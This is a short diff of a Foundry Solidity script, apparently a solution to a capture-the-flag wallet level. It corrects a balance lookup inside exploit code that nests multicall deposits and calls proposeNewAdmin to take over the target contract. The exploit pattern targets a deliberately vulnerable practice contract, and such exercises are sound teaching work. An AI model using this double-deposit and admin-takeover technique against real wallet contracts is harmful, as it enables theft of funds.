@@ -14,7 +14,7 @@ contract ExploitLevel24 is Script {
         bytes[] memory nestedMulticall = new bytes[](2);
         nestedMulticall[0] = abi.encodeWithSelector(instance.deposit.selector);
         nestedMulticall[1] = abi.encodeWithSelector(instance.multicall.selector, depositSelector);
-        uint256 instBalance = instance.balance;
+        uint256 instBalance = address(instance).balance;
 
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         instance.proposeNewAdmin(player);
